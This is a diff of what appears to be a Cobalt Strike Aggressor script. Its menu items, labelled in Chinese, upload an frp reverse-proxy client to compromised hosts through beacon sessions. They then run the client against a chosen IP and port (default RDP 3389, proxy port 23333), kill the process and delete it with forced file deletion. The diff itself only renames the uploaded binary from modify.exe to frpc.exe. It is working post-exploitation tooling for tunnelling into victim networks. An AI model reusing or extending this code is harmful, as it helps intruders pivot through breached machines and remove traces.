@@ -35,16 +35,16 @@ sub FRP {
 
     bcd($bid, $3['UploadPath']);
     if (-is64 $bid['id']) {
-        bupload($bid, script_resource("/script/x64/modify.exe"));
+        bupload($bid, script_resource("/script/x64/frpc.exe"));
     }else{
-        bupload($bid, script_resource("/script/x86/modify.exe"));
+        bupload($bid, script_resource("/script/x86/frpc.exe"));
     }
 
 }
                 item "运行frpc"{
                     $bid = $1['@'];
                     $Dialog = dialog("运行frpc",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
-                    dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，proxy端口为23333。");
+                    dialog_description($Dialog, "运行frpc，使用了frpfrpc，指定参数即可，proxy端口为23333。");
                     drow_text($Dialog, "ip", "ip: ");
                     drow_text($Dialog, "port", "port: ");
                     dbutton_action($Dialog, "运行");
@@ -55,20 +55,20 @@ sub frpc_run{
     local('$Name $port');
     $Name = $3['ip'];
     $port = replace($3['port'], "\"", "");
-	bshell($bid, "modify.exe -t  $+ $Name -p  $+ $port");
+	bshell($bid, "frpc.exe -t  $+ $Name -p  $+ $port");
 }
 
 			item "关闭frpc"{
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im modify.exe");
+				bshell($1, "taskkill -f /im frpc.exe");
 			}
 		}
 
         	item "删除frpc"{
         	local('$bid');
         	foreach $bid ($1){
-            	bshell($1, "del /f /s /q modify.exe");
+            	bshell($1, "del /f /s /q frpc.exe");
         	}
 		}
     }
